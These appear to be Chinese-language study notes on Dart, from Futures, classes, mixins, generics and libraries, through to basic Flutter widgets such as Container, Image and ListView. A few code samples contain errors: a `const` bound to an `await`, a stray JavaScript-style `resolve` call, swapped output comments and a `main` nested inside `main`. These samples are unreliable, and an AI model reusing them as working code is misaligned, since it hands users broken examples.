    final url = Uri.parse('https://httpbin.org/ip');
    Future getIPAddress1() {
      return http.get(url).then((response){
        String ip = jsonDecode(response.body)['origin'];
        return ip;
      });
    }
    
    void main() {
      getIPAddress1()
        .then((ip) => print(ip))
        .catchError((error) => print(error));
    }
    ```

    方式二：

    ```
    import 'package:http/http.dart' as http;
    import 'dart:convert';
    //https://httpbin.org/ip  //返回ip地址
    final url = Uri.parse('https://httpbin.org/ip');
    Future getIPAddress2() async {
      final url = Uri.parse('https://httpbin.org/ip');
      final response = await http.get(url);
      String ip = jsonDecode(response.body)['origin'];
      return ip;
      resolve(ip)
    }
    
    void main() async {
      try {
        const ip = await getIPAddress2();
        print(ip);
      } catch (e) {
        print(e);
      }  
    }
    ```

    

- Future详情

  - https://api.dart.dev/stable/2.13.4/dart-async/Future-class.html

  

#### 类与对象

##### 类

###### 简介

> 类是通过class声明的代码段，包含属性和方法。
>
> ​	属性：用来描述类的变量
>
> ​	方法：类中的函数称为类
>
> 对象是类的实例化结果（var obj = new MyClass())
>
> 编程方式
>
> ​	面向对象编程(OOP)
>
> ​	面向过程编程(POP)

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210726233437.png" alt="image-20210726233437018" style="zoom: 50%;" />

**声明类：**

```
	//声明类
     class Person {
       //类的属性
       String name = '张三';
       //类的方法
       void getInfo() {
         print('我是$name');  //张三
       }
     }
     void main() {
       //实例化类，然后得到一个对象
       Person p = new Person();
       //访问类中的属性
       print(p.name);   //张三
       //访问类中的方法
       p.getInfo();
     }
```

###### 构造器（构造函数）

1、默认构造函数

> 与类同名的函数，在实例化时，自动被调用

```
class Point {
  num x, y;
  //声明普通构造函数
  // Point() {
  //   //初始化类属性
  //   this.x = 1;
  //   //this可以省略,不过当命名只想有歧义时，this不能省略，比如参数和属性同命
  //   y = 2;
  //   print('我是默认构造函数，实例化时，会第一个被调用');
  // }
  // 简化构造函数,这种参数得与属性名相同并加上this.,可以对属性赋默认值
  Point(this.x, this.y);
}

void main() {
  var p = new Point(1, 2);
  print(p.x);
  print(p.y);
}
```

2、命名构造函数

> 在类中使用命名构造器（类名.函数名）实现多个构造器，可以提供额外的清晰度

```
     class Point {
       num x, y;
       Point(this.x, this.y);
       //命名构造函数
       Point.origin() {
         x = 0;
         y = 0;
       }
       //命名构造函数
       Point.fromJson({x = 0, y = 0}) {
         this.x = x;
         this.y = y;
       }
     }
     void main() {
       //默认坐标
       Point p1 = new Point.origin();
       print(p1.y);
       //手动设置坐标
       Point p2 = new Point.fromJson(x:6, y:6);
       print(p2.x);
     }
```

3、常量构造函数

> 如果类生成的对象不会改变，您可以通过常量构造函数使这些对象成为编译时常量

```
     class Point {
       num x;
       num y;
       Point(this.x, this.y);
     }
     class ImmutablePoint {
       //如果是常量构造函数，属性必须通过final声明
       final num x;
       final num y;
       //常量构造函数，必须通过const声明
       const ImmutablePoint(this.x, this.y);
     }
     void main() {
       //普通构造函数
       var p1 = new Point(1, 2);
       var p2 = new Point(1, 2);
       print(p1 == p2); //false

       //常量构造函数，可以当作普通构造函数使用
       var p3 = new ImmutablePoint(1, 2);
       var p4 = new ImmutablePoint(1, 2);
       print(p3 == p4); //false

       //声明不可变对象，必须通过const关键字
       var p5 = const ImmutablePoint(1, 2);
       var p6 = const ImmutablePoint(1, 2);
       var p7 = const ImmutablePoint(1, 3);
       print(p5.y);
       print(p6.y);
       print(p5 == p6); //true
       print(p5 == p7); //false
     }

```

4、工厂构造函数

> ​	通过factory声明， 工厂函数不会自动生成实例， 而是通过代码来决定返回的实例

```
     class Person {
       String name;
       //static修饰的变量可以直接通过类名.属性访问
       static Person instance;
       //工厂构造函数，new 类的时候会执行工厂构造函数，但不会实例化，设计模式中的单例模式
       factory Person([String name = '刘备']) {
         //工厂构造函数中，不能使用this关键字
         if (Person.instance == null) {
           //第一次实例化
           Person.instance = new Person.newSelf(name);
         }
         //非第一次实例化
         return Person.instance;
       }
       //命名构造函数
       Person.newSelf(this.name);
     }
     void main() {
       //实例化操作
       Person p1 = new Person('关羽');
       print(p1.name);  //关羽
       Person p2 = new Person('关羽2');
       print(p2.name);  //关羽
     }
```

###### 访问修饰

> Dart与TypeScript不同，没有访问修饰符（public、protected、private)

- Dart类中，默认的访问修饰符是公开的(即public)
- 如果属性或方法以_（下划线)开头，则表示私有（即private)
- *只有把类单独抽离出去，私有属性和方法才起作用*

lib/Person.dart

```
class Person {
  //公有属性
  String name;
  //声明私有属性,外部访问不到，但是必须是引入的，如果是同一个文件仍然可以访问
  num _money = 100;
  Person(this.name);
  num getMoney() {
    return this._money;
  }
  //声明私有方法
  void _wife() {
    print('我是 $name');
  }
}
```

private.dart

```
import './lib/Person.dart';

void main() {
  var p = new Person('张三');
  //访问公有属性
  print(p.name);

  //访问私有属性
  print(p.getMoney());   //100
  print(p._money);       //报错
  p._wife();             //报错
}
```

###### Getter和Setter

> Getter(获取器)是通过get关键字修饰的方法
>
> ​		函数没有小括号，访问时也没有小括号（像访问属性一样访问方法）
>
> Setter（修改器）是通过set关键字修饰的方法
>
> ​		访问时，像设置属性一样给函数传参

简单使用：

```
     class Person {
       //公有属性
       String name;

       //声明私有属性,外部访问不到，但是必须是引入的，如果是同一个文件仍然可以访问
       num _money = 100;

       Person(this.name);

       num getMoney() {
         return this._money;
       }
       //声明私有方法
       void _wife() {
         print('我是 $name');
       }
     }
```

###### 初始化列表

> 作用：在构造函数中设置属性的默认值
>
> 时机：在构造函数执行之前执行
>
> 语法：使用逗号分隔初始化表达式
>
> 场景：常用于设置final常量的值

简单使用：

```
     class Rect {
       int height;
       int width;

       //Rect(this.height, this.width);

       // Rect([int height = 2, int width = 10]) {
       //   this.height = height;
       //   this.width = width;
       //   print('${this.height} -- ${this.width}');
       // }

       //初始化列表
       Rect()
           : height = 4,
             width = 20 {
         print('${this.height} -- ${this.width}');
       }
     }

     class Point {
       double x, y, z;
       Point(this.x, this.y, this.z);

       //初始化列表的特殊用法(重定向构造函数)
       Point.twoD(double x, double y) : this(x, y, 0);
     }

     void main() {
       var r = new Rect();
       var p1 = new Point(1, 2, 3);
       print(p1.z);
       var p2 = new Point.twoD(1, 2);
       print(p2.z);
     }
```



###### static

> - static关键字用来指定静态成员
>   - 通过修饰的属性是静态属性
>   - 通过static修饰的方法是静态方法
> - 静态成员可以通过类名称直接访问（不需要实例化）
>   - 实例化是比较消耗资源的，声明静态成员，可以提高程序性能
> - 静态方法不能访问非静态成员，非静态成员可以访问静态成员
>   - 静态方法不能使用t'his关键字
>   - 不能使用this关键字访问静态属性

简单使用：

```
     class Person {
       static String name = '张三';
       int age = 18;

       static printInfo() {
         // print(this.name);  //不能通过this关键字访问静态属性
         print(name);

         //静态方法中不能访问非静态属性
         // print(age);
         //静态方法不能访问非静态方法
         // print(printUserInfo())
       }

       void printUserInfo() {
         //非静态方法可以访问静态属性
         print(Person.name);
         //非静态方法可以访问静态方法
         Person.printInfo();
       }
     }

     void main() {
       //静态成员, 可以通过类名称直接访问
       print(Person.name);
       print(Person.printInfo());

       //不能通过类名称直接访问非静态方法和属性
       //print(person.printUserInfo());

       var p = new Person();
       p.printUserInfo();
       //不能通过实例化对象去访问静态属性
       // print(p.name);   //报错
     }
```

###### 元数据

> - 元数据以@开头， 可以给代码标记一些额外的信息
>   - yuan数据可以用来库， 类， 构造器， 函数， 字段， 参数或变量声明的前面
> - @override（重写）
>   - 某方法添加该注解后， 表四重写了父类中的同名方法
> - @required（必填）
>   - 可以通过@required来注解Dart中的命名参数， 用来指示它是必填参数
> - @deprecated（弃用）
>   - 若某类或某方法加上该注解之后， 表示此方法或类不再建议使用

##### 继承

> - 根据类的先后顺序，可以将类分成父类和子类
> - 子类通过extends关键字继承父类
>   - 继承后， 子类可以使用父类中可见的内容（属性或方法）
> - 子类中，可以通过@override元数据来标记“覆写”方法
>   - “覆写”方法： 子类中与父类中同名的方法
> - 子类中， 可以通过super关键字来引用父类中，可见的内容
>   - 属性
>   - 方法(普通构造函数， 命名构造函数)

*注意：子类的构造方法默认会调用父类的无名无参构造方法且在子类的构造函数第一行执行*，*如果有初始化列表，初始化列表会在父类的构造方法之前执行*

```
     void main(){
       var student = new Student();
     }

     class Person{
       String name;
       Person(){
         print("Person...");
       }
     }

     class Student extends Person{
       int age;
       Student() {
       	print("Student...");
       }
     }
```

输出结果为：Person...  Student...

*每个类都会有一个默认的无参构造方法，所以当我们在父类不定义构造方法时是不会报错的，但是如果声明了有参构造方法，那么就子类那边就会调用*

*这个有参构造方法，我们必须显式调用，这个构造方法，当然，我们也可以在父类中定义一个无参构造方法，这样就不会调用父类有参构造方法了*

```
     void main() {
       var student = new Student("Tom");
       print(student.name);
     }

     class Person {
       String name;

       Person(this.name);

       Person.withName(this.name);
     }

     class Student extends Person {
       int age;

       //Student(String name) : super(name);

       Student(String name) : super.withName(name);
     }
```

##### 抽象类

> - 抽象类是用abstract关键字修饰的类
> - 抽象类的作用是充当普通类的模板， 约定一些必要的属性和方法
> - 抽象方法是指没有方法体的方法
>   - 抽象类中一般都有抽象方法， 也可以没有抽象方法
>   - 普通类中，不能有抽象方法
> - 抽象类不能被实例化（不能被new)
> - 抽象类可以被普通类继承（extends)
>   - 如果普通类继承抽象类， 必须实现抽象类中的所有抽象方法
> - 抽象类还可以充当接口被实现（implements)
>   - 如果把抽象类当做接口实现的话， 普通类必须得实现抽象类里面定义得所有属性和方法

简单使用：

```
     //1、抽象类， 必须通过abstract关键字声明
     //2、抽象类中，可以有抽象方法， 也可以没有抽象方法， 一般来说，抽象类都会有抽象方法
     abstract class Phone {
       //声明抽象方法
       void camera(); //手机的处理器

       void processor(); //手机的处理器

       //抽象类中可以定义普通方法
       void info() {
         print('我是抽象类中的普通方法info');
       }
     }

     class Xiaomi extends Phone {
       //普通类继承了抽象类， 就必须实现抽象类中所有的抽象方法
       @override
       void processor() {
         print('晓龙888');
       }

       @override
       void camera() {
         print('三星摄像头');
       }
       //普通类中不能有抽象方法
       //void aaa();
     }

     void main() {
       // 抽象类， 不能被实例化
       // var p1 = new Phone();

       Xiaomi m = new Xiaomi();
       m.processor();            //晓龙888
       m.info();                 //我是抽象类中的普通方法info
     }
```

##### 接口

> - 接口在Dart中就是一个类（知识用法不同）
>   - 与Java不同，Java中的接口需要用interface关键字声明；Dart中不需要
>   - 接口可以是任意类，但一般使用抽象类做接口
> - 一个类可以实现(implements) 多个接口，多个接口用逗号分隔
>   - class MyClass implements Interface1, Interface2{ ... }
>   - 接口可以看成一个个小零件。类实现接口就相当于组装零件
> - 普通类实现接口后，必须重写接口中所有的属性和方法

简单使用：

```
     // 手机处理器
     abstract class Processor {
       String cores;  //内核： 2核，4核
       arch(String name); //芯片制程：7nm, 5nm
     }

     //手机的摄像头
     abstract class Camera {
       String resolution;   //分辨率
       brand(String name);  //品牌
     }

     class Phone implements Processor, Camera {
       @override
       String cores;
       @override
       String resolution;

       //构造函数
       Phone(this.cores, this.resolution);
       @override
       arch(String name) {
         print('芯片制程：' + name);
       }
       @override 
       brand(String name) {
         print('相机品牌：' + name);
       }
     }

     void main() {
       Phone p = new Phone('4核','1000万');
       p.arch('5nm');
       p.brand('索尼');
     }
```

##### 混入

> - 混入（Mixin)是一段公共代码。混入有两种声明方式：
>   - 将类当作混入class mixinA { ... }
>     - 作为Mixin的类只能继承自Object, 不能继承其他类
>     - 作为Mixin的类不能有构造函数
>   - 使用mixin关键字声明mixin MixinB { ... }
> - 混入（Mixin）可以提高代码复用的效率，普通类可以通过with来使用混入
>   - class MyClass with mixinA, MixinB { ... }
> - 使用多个混入时，后引入的混入会覆盖之前混入中的重复内容
>   - MixinA和MixinB中都有hello()方法，MyClass会使用MixinB中的

简单使用：

```
class MixinA {
  String name = 'MixinA';
  //MixinA();     //用作混入的类，不能拥有构造函数
  void printA() {
    print('A');
  }
  void run() {
    print('run in MixinA');
  }
}

mixin MixinB {
  String name = 'MixinB';
  void printB() {
    print('B');
  }
  void run() {
    print('run in MixinB');
  }
}

class MyClass with MixinA, MixinB {}

void main() {
  var c = new MyClass();
  c.printA();
  c.printB();
  // 后引入的混入，会覆盖之前引入的混入中重复的内容
  print(c.name); //MixinB

  c.run();
}
```

##### 泛型

> 泛型是在函数、类、接口中指定宽泛数据类型的语法
>
> - 泛型函数
> - 泛型类
> - 泛型接口
>
> 通常，在尖括号中，使用一个字母来代表类型，例如E,T,S,K和V等
>
> ​	返回类型 函数名，输入类型>(参数类型 参数) {
>
> ​			函数体
>
> ​	}
>
> 作用：使用泛型可以减少重复的代码

###### 泛型函数

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210801184115.png" alt="image-20210801184115648" style="zoom: 50%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210801184201.png" alt="image-20210801184200841" style="zoom:50%;" />

简单使用：

```
     // String getData(String value) {
     //   return value;
     // }

     // 不指定数据类型的函数
     // getData(value) {
     //   return value;
     // }

     //泛型函数
     T getData<T>(T value) {
       return value;
     }

     //只约定参数类型，不约定函数返回值的类型
     getData2<T>(T value) {
       return value;
     }

     void main() {
       print(getData<String>('Hello'));
       print(getData<int>(100));
     }
```

###### 泛型类

简单使用：

```
class CommonClass {
  Set s = new Set<int>();
  void add(int value) {
    this.s.add(value);
  }

  void info() {
    print(this.s);
  }
}

//泛型类
class GenericsClass<T> {
  Set s = new Set<T>();
  void add(T value) {
    this.s.add(value);
  }

  void info() {
    print(this.s);
  }
}

void main() {
  CommonClass c = new CommonClass();
  c.add(1);
  //实例化泛型类
  var g1 = new GenericsClass<int>();
  g1.add(1);
  g1.add(2);
  var g2 = new GenericsClass<String>();
  g2.add('1');
  g2.add('2');

  Set s = new Set();
  s.add(1);
  // s.add('hello');    //报错

  //字面量形式的泛型
  Set s = <int>{};
  s.add(1);
  // s.add('hello');    //报错
}
```

###### 泛型接口

简单使用：

```
abstract class ObjectCache {
  getBykey(String key);
  void setByKey(String key, Object value);
}

abstract class StringCache {
  getBykey(String key);
  void setByKey(String key, String value);
}

abstract class Cache<T> {
  getBykey(String key);
  void setByKey(String key, T value);
}

//文件缓存
class FileCache<T> implements Cache<T> {
  @override
  getBykey(String key) {
    // TODO: implement getBykey
    return null;
  }

  @override
  void setByKey(String key, T value) {
    // TODO: implement setByKey
    print('文件缓存：key = ${key} value=${value}');
  }
}

//内存缓存
class MemoryCache<T> implements Cache<T> {
  @override
  getBykey(String key) {
    // TODO: implement getBykey
    return null;
  }

  @override
  void setByKey(String key, T value) {
    // TODO: implement setByKey
    print('内存缓存：key = ${key} value=${value}');
  }
}

void main() {
  //文件缓存 - 缓存字符串
  FileCache fc = new FileCache<String>();
  fc.setByKey('foo','bar');
  // fc.setByKey('f', 2);  //报错

  // 文件缓存 - 缓存字符串
  FileCache fc2 = new FileCache<Map>();
  fc2.setByKey('index',{"name" : 'fuck'});

  //内存缓存 - 缓存字符串
  var mc = new MemoryCache<String>();
  mc.setByKey('foo', 'Bar');
}
```

###### 泛型类型限制

简单使用：

```
     class SomeBaseClass {}

     class Extender extends SomeBaseClass {}

     //如果T不传，那么默认就是SomeBaseClass
     class Foo<T extends SomeBaseClass> {
       String toString() => "Instance of 'Foo<$T>'";
     }

     void main() {
       var f = new Foo();
       print(f.toString());

       var f2 = Foo<SomeBaseClass>();
       var f3 = Foo<Extender>();
       // var f4 = Foo<int>(); //报错
       //打印类实例的时候会自动调用实例的toString方法
       print(f2);
       print(f3);
       // print(f4);
     }
```

##### 枚举

> 枚举是数量固定的常量值，通过enum关键字声明
>
> ​	enum Color { red, green, blue }
>
> 枚举的values常量，可以获取所有枚举值列表
>
> ​	List<Color>colors = Color.values;
>
> 可以通过index获取值的索引
>
> ​	assert(color.green.index == 1);

简单使用：

```
     enum Color { red, green, blue }

     void main() {
       //通过index返回枚举中具体常量的值
       print(Color.green.index);

       //通过values返回常量列表
       print(Color.values);
       List<Color> colors = Color.values;
       print(colors);

       //通过下表，访问列表中的内容
       print(colors[0]);
       //通过forEach去遍历列表的内容
       colors.forEach((ele) {
         print('value: $ele, index: ${ele.index}');
       });
     }
```

#### 库与生态

##### 简介

> Dart中的库就是具有特定功能的模块
>
> ​	可能包含单个文件，也可能包含多个文件
>
> 按照库的作者进行划分，库可以分为三类
>
> - 自定义库（工程师自己写的）
> - 系统库（Dart中自带的）
> - 第三方库(Dart生态中的)
>
> Dart生态
>
> - https://pub.dev/
> - pub命令(flutter\bin\cache\dart-sdk\bin)

![image-20210801220358820](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210801220359.png)

##### 库的使用

*不同类型的库引入方式不同*

- 自定义库（import '库的位置/库名称.dart')
- 系统库(import 'dart:库名称')
- 第三方库

*引入部分库（仅引入需要的内容）*

- ```
  //lib.common.dart
  void f1() {
    print('f1 is running');
  }
  void f2() {
    print('f2 is running');
  }
  void f3() {
    print('f2 is runnnig');
  }
  ```

- 包含引入（show)

- ```
  //show后面指定包含引入的内容
  import 'lib/common.dart' show f1, f3;
  
  void main() {
    f1();
    // f2();   //报错
    f3();  
  }
  ```

- 排除引入（hide)

- ```
  //hide后面指定隐藏引入的内容
  import 'lib/common.dart' hide f1, f3;
  
  void main() {
    // f1();   //报错
    f2();   
    // f3();   //报错  
  } 
  ```

*指定库的前缀*

- 当库名冲突时，可以通过as关键字，给库声明一个前缀

  ```
  //lib/common.dart
  f1() {
    print('__________');
  }
  ```

  ```
  //lib/function.dart
  void f1() {
    print('f1 is running');
  }
  void f2() {
    print('f2 is running');
  }
  void f3() {
    print('f2 is runnnig');
  }
  ```

  简单使用：

  ```
  import 'lib/common.dart';
  import 'lib/function.dart' as func;  //给库添加前缀，解决命名冲突问题
  
  
  void main() {
    f1();       //f1 is running
    func.f1();  //____________
  }
  ```

*延迟引入*

​	简单使用：

- ```
  //lib/function.dart
  f1() {
    print('__________');
  }
  ```

- ```
  import 'lib/function.dart' deferred as func;
  
  void main() {
    print('1');
    greet();
    print('2');
    print('3');
  }
  
  Future greet() async {
    await func.loadLibrary();
    func.f1();
  }
  ```

  输出结果：

  ![image-20210802003750101](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210802003750.png)

*通过part与part of来组装库*

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210802004058.png" alt="image-20210802004058115" style="zoom: 67%;" />

简单使用：

- ```
  //Camera.dart
  //与主库建立联系
  part of phone;
  
  class Camera {
    String name = '摄像头';
  
    void info() {
      print('我是摄像头');
    }
  }
  ```

- ```
  //Processor.dart
  //与主库建立联系
  part of phone;
  
  class Processor {
    String name = '处理器';
  
    void info() {
      print('我是处理器');
    }
  }
  ```

- ```
  //lib/main.dart
  library phone;
  import 'dart:math';
  //与分库建立联系
  part 'Camera.dart';
  part 'Processor.dart';
  
  void main() {
  
    void main() {
      Camera c = new Camera();
      c.info();
    }
  
    print(pi);
  }
  ```

  使用：

- ```
  //part.dart
  import 'lib/main.dart' as phone;
  
  void main() {
    phone.Camera c = new phone.Camera();
    c.info();
    phone.main();
  }
  ```

##### 自定义库

> 每个Dart文件默认都是一个库，只是没有使用library来显式声明
>
> Dart使用_(下划线)开头的标识符，表示库内访问可见（私有)
>
> Library关键字声明的库名称建议使用：小写字母+下划线



<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210801220522.png" alt="image-20210801220521922" style="zoom: 67%;" />

简单使用：

库：

```
     library my_custom;  //非必须，可省略,建议写成小写字母+下划线的形式

     class MyCustom {
       String name = "MyCustom";
       static num version = 1.0;

       void info() {
         print('我是自定义库');
       }
     }

     fun() {
       print('我是自定义库中的方法');
     }
```

使用：

```
     import 'lib/MyCustom.dart';

     void main() {
       MyCustom mc = new MyCustom();
       mc.info();
       print(MyCustom.version);
       fun();
     }
```

##### 系统库

> 系统库（也叫核心库）是Dart提供的常用内置库
>
> ​	不需要单独下载就可以直接使用
>
> 引入
>
> ​	import 'dart:库名';
>
> ​	import 'dart:core';   //会自动引入（无需手动引入）
>
> 系统库列表
>
> ​	https://dart.cn/guides/libraries

简单使用：

```
import 'dart:math';

void main() {
  print(min(1,2));
}
```

##### 第三方库

> - 来源
>
>   - https://pub.dev
>   - https://pub.flutter-io.cn/packages
>   - https://pub.dartlang.org/flutter
>
> - 使用
>
>   - 在项目目录下创建pubspec.yaml
>
>   - 在pubspec.yaml中声明第三方库（依赖）
>
>   - 命令行中进入pubspec.yaml所在目录，执行pub get进行安装
>
>   - 项目中引入已安装的第三方库（import 'package:xxxxx/xxxxx.dart');
>
>     或者
>
>     <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210802011639.png" alt="image-20210802011639386" style="zoom:67%;" />
>
> - 第三方库的结构
>
>   - 一个第三方库，必须包含一个叫pubspec.yaml文件
>
>   - <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210802010807.png" alt="image-20210802010807357" style="zoom: 67%;" />
>
>   - pubspec.yaml
>
>     - 详情：https://dart.cn/tools/pub/pubspec
>
>     <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210802011040.png" alt="image-20210802011040694" style="zoom:67%;" />

## flutter组件

*flutter组件大全：https://flutter.cn/docs/reference/widgets*

### MaterialApp

> MaterialApp是一个方便的Widget，它封装了应用程序实现Material Design所需要的一些Widget.一般作为顶层widget使用
>
> 常用的属性：
>
> - home (主页)
> - title (标题)
> - color (颜色)
> - theme (主题)
> - routes (路由)
> - ......

### Scaffold

> Scaffold是Material Design布局结构的基本实现。此类提供了用于显式drawer、snackbar和底部sheet的API。
>
> 常用的属性：
>
> - appBar：显示在界面顶部的一个AppBar
> - body：当前界面所显示的主要内容Widget
> - drawer：抽屉菜单控件

简单使用：

```
     import 'package:flutter/material.dart';
     void main() {
       runApp(
         MyApp()
       );
     }

     //自定义组件
     class MyApp extends StatelessWidget {
       @override
       Widget build(BuildContext context) {
         return MaterialApp(
           home: Scaffold(
             appBar: AppBar(
               title: Text('Flutter'),
             ),
             body: HomeContent(),

           ),
           theme: ThemeData(
             primarySwatch: Colors.yellow,
           )
         );
       }
     }

     class HomeContent extends StatelessWidget {
       @override
       Widget build(BuildContext context) {
         return Center(
           child: Text("hello flutter",
               textDirection: TextDirection.ltr),
         );
       }
     }
```

效果：

![image-20210805024043161](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210805024043.png)

### Text

常用参数配置：

![image-20210806035545578](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210806035545.png)

  ![image-20210806035625396](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210806035625.png)

更多参数：https://api.flutter.dev/flutter/widgets/Text-class.html

### Container(容器)

> 一个容器组件，类似与html的div标签

常用参数：

![image-20210806035918449](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210806035918.png)

![image-20210806035947797](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210806035948.png)

更多参数：https://api.flutter.dev/flutter/widgets/Container-class.html 

简单使用：

```
     import 'package:flutter/material.dart';
     void main() {
       runApp(
         MyApp()
       );
     }

     //自定义组件
     class MyApp extends StatelessWidget {
       @override
       Widget build(BuildContext context) {
         return MaterialApp(
           home: Scaffold(
             appBar: AppBar(
               title: Text('Flutter'),
             ),
             body: HomeContent(),

           ),
           theme: ThemeData(
             primarySwatch: Colors.yellow,
           )
         );
       }
     }

     class HomeContent extends StatelessWidget {
       @override
       Widget build(BuildContext context) {
         return Center(
           child: Container(
             child: Text("hello flutter,这是一段非常长的文字呀呀呀呀呀呀呀呀呀",
                 // 字体方向
                 textDirection: TextDirection.ltr,
                 // 字体水平对齐
                 textAlign: TextAlign.center,
                 // 内容溢出处理
                 overflow: TextOverflow.ellipsis,
                 // 显示行数
                 maxLines: 2,
                 // 字体方法倍数
                 textScaleFactor: 1.2,
                 // 字体样式
                 style: TextStyle(
                   fontSize: 26.0,
                   color: Colors.orange,
                   // color: Color.fromRGBO(29, 23, 111, 0.5),
                   fontWeight: FontWeight.w800,
                   // 字体风格
                   fontStyle: FontStyle.italic,
                   decoration: TextDecoration.lineThrough,
                   decorationColor: Colors.white,
                   decorationStyle: TextDecorationStyle.dashed,
                   //字体间距倍数
                   letterSpacing: 1.5
                 ),
             ),
             height: 300.0,
             width: 300.0,
             // 样式
             decoration: BoxDecoration(
               color: Colors.pink,
               //边框
               border: Border.all(
                 color: Colors.blue,
                 width: 2.0
               ),
               //边框圆角
               borderRadius: BorderRadius.all(Radius.circular(60)),
             ),
             // 内边距
             padding: EdgeInsets.fromLTRB(10, 30, 5, 0),
             // padding: EdgeInsets.all(20),
             //外边距
             margin: EdgeInsets.fromLTRB(10, 10, 10, 10),
             //平移
             // transform: Matrix4.translationValues(50, 0, 0),
             //旋转
             // transform: Matrix4.rotationZ(-0.4),
             // 缩放
             transform: Matrix4.diagonal3Values(1.2, 1, 1),
             // 容器内容摆放位置
             alignment: Alignment.center,
           )
         );
       }
     }
```

### Image(图片)

> 图片组件是显示图像得组件，Image组件有很多构造函数，这里介绍下其中比较常用的两个
>
> - Image.asset	本地图片
> - Image.network    远程图片

Image组件的常用的属性：

![image-20210807122326147](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210807122326.png)

![image-20210807122418288](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210807122418.png)

更多属性参考：https://api.flutter.dev/flutter/widgets/Image-class.html 

简单使用：

（引入网络图片）

```
     import 'package:flutter/material.dart';
     class ImageWraper extends StatelessWidget {
       @override
       Widget build(BuildContext context) {
         // TODO: implement build
         return Container(
             child: Image.network(
               "http://17721217.s143i.faiusr.com/2/1/AI8BCAAQAhgAIJKG_oYGKJCotu8DMFc4Vw.jpg",
               //图片放置位置
               alignment: Alignment.bottomCenter,
               color: Colors.blue,
               colorBlendMode: BlendMode.screen,
               fit: BoxFit.contain,
               repeat: ImageRepeat.repeat,
             ),
             width: 300,
             height: 300,
             decoration: BoxDecoration(
               color: Colors.yellow
             ),
         );
       }
     }
```

引入本地图片（非必须是image,可以自定义路径）

![image-20210807133620552](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210807133620.png)

组件代码：

```
import 'package:flutter/material.dart';
class ImageWraper extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    // TODO: implement build
    return Container(
        child: Image.asset("images/girl.jpg",
              fit: BoxFit.cover
        ),
        width: 375.0,
        height: 375.0,
        padding: EdgeInsets.all(20),
        decoration: BoxDecoration(
          color: Colors.blue
        ),
    );
  }
}
```

效果：

![image-20210807134404458](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210807134404.png)

**Flutter实现圆角以及实现圆形图片**：

方案一（利用Container的borderRadius属性）：

```
     class ImageWraper extends StatelessWidget {
       @override
       Widget build(BuildContext context) {
         // TODO: implement build
         return Container(
           width: 300.0,
           height: 300.0,
           padding: EdgeInsets.all(20),
           decoration: BoxDecoration(
               color: Colors.blue,
               borderRadius: BorderRadius.circular(150),
               image: DecorationImage(
                 image: new NetworkImage(""
                     "http://17721217.s143i.faiusr.com/2/1/AI8BCAAQAhgAIJKG_oYGKJCotu8DMFc4Vw.jpg"
                 ),
                 fit: BoxFit.cover
               )
           ),
         );
       }
     }
```

方案二：

```
     class ImageWraper extends StatelessWidget {
       @override
       Widget build(BuildContext context) {
         // TODO: implement build
         return Center(
           child: Container(
             child: ClipOval(
               child: Image.network(
                   "http://17721217.s143i.faiusr.com/2/1/AI8BCAAQAhgAIJKG_oYGKJCotu8DMFc4Vw.jpg",
                   width: 200.0,
                   height: 200.0,
                   fit: BoxFit.contain,
               ),
             ),
             decoration: BoxDecoration(
               color: Colors.yellow
             ),
           )
         );
       }
     }
```

效果：

![image-20210808194826701](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210808194827.png)

### ListView(列表)

> 列表布局是我们项目开发中最常用的一种布局方式。Flutter 中我们可以通过 ListView 来定义 
>
> 列表项，支持垂直和水平方向展示。通过一个属性就可以控制列表的显示方向。列表有一下 
>
> 分类：
>
> - 垂直列表
> - 垂直图文列表
> - 水平列表
> - 动态列表
> - 矩阵式列表

#### 列表参数

![image-20210808202234330](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210808202234.png)

![image-20210808202304947](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210808202305.png)

#### 基本列表

```
class ListWrapper extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    // TODO: implement build
    return ListView(
      //内边距
      padding: EdgeInsets.all(0),
      children: [
        Image.network("https://img2.baidu.com/it/u=3494680980,3429350889&fm=26&fmt=auto&gp=0.jpg"),
        Container(
          child: Text(
            '我是一个标题',
            textAlign: TextAlign.center,
            style: TextStyle(
              fontSize: 28
            ),
          ),
          // height: 40,
          padding: EdgeInsets.all(40.0),
        ),
        ListTile(
          leading: Icon(Icons.settings, color: Colors.pink,),
          title: Text('华北黄淮高温雨今起强势登场'),
          subtitle: Text("中国天气网讯21日开始，华北黄淮高温雨今起强势登场"),
        ),
        ListTile(
          //首部
          leading: Icon(Icons.home, size: 40,),
          //主标题
          title: Text('华北黄淮高温雨今起强势登场'),
          //副标题
          subtitle: Text("中国天气网讯21日开始，华北黄淮高温雨今起强势登场"),
          //尾部
          trailing: Icon(Icons.menu),
        ),
        ListTile(
          leading: Image.network(("http://17721217.s143i.faiusr.com/2/1/AI8BCAAQAhgAIJKG_oYGKJCotu8DMFc4Vw.jpg")),
          title: Text('华北黄淮高温雨今起强势登场'),
          subtitle: Text("中国天气网讯21日开始，华北黄淮高温雨今起强势登场"),
          trailing: Image.network(("http://17721217.s143i.faiusr.com/2/1/AI8BCAAQAhgAIJKG_oYGKJCotu8DMFc4Vw.jpg")),
        )
      ],
    );
  }
}
```

![image-20210808203314917](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210808203315.png)

#### 水平列表

```
class ListWrapper extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    // TODO: implement build
    return Container(
